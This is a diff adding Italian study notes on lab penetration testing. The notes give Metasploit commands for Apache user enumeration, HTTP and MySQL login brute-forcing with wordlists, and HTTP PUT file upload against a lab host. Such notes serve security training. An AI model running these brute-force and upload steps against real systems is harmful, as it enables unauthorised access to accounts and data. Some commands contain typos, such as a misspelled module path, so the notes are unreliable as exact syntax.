@@ -238,3 +238,82 @@ set VERBOSE false  //cambiamo anche il VERBOSE per evitare che ci faccia vedere 
 run
 ```
 
+### Determinare gli utenti esistenti tramite Apache
+
+Modulo che utilizza il UserDir directive presente in Apache per determinare quali utenti esistono e quali no
+
+```
+use auxiliary/scanner/http/apache_userdir_enum
+info
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+```
+
+Abbiamo trovato così qualche utente del webserver, e possiamo usare questa informazione inserendola come utente nel bruteforce del login.
+
+### Bruteforce login per pagine HTTP con un utente già identificato
+
+Esempio con l'utente rooty trovato con il modulo sopra
+
+```
+use auxiliary/scanner/http/http_login
+echo "rooty" > user.txt
+set USER_FILE /root/user.txt
+run
+```
+
+### Effettuare un upload di un file sul webserver <a href="#effettuare-un-upload-di-un-file-sul-webserver" id="effettuare-un-upload-di-un-file-sul-webserver"></a>
+
+```
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set FILEDATA "Welcome To AttackDefense"
+run
+```
+
+#### Cancellare il file caricato
+
+```
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set ACTION DELETE
+run
+```
+
+## MySQL Enumeration
+
+### Avvio Metasploit Framework (MSF)
+
+Primi passi per avviare metsploit e configurarlo brevemente per questa sessione:
+
+```
+service postgresql start
+msfconsole
+workspace -a MySQL_ENUM
+setg RHOSTS <IP dest>
+setg RHOST <IP dest>
+search type:auxiliary name:mysql
+```
+
+### MySQL version enumeration
+
+```
+use auxiliary/scanner/mysql/mysql_version
+```
+
+### MySQL Login brute force attack
+
+Per trovare gli utenti e accedere al DB possiamo o sfruttare delle vulnerabilità per la versione di SQL, ma in questo caso non è vulnerabile, oppure usiamo il modulo mysql\_login che permette di fare un brute force (dictionary attack) per trovare utenti e password del DB.
+
+```
+use auxiliary/scanner/myssql/mysql_login
+set username root //per provare a trovare la password per l'utente root direttamente
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+```
+
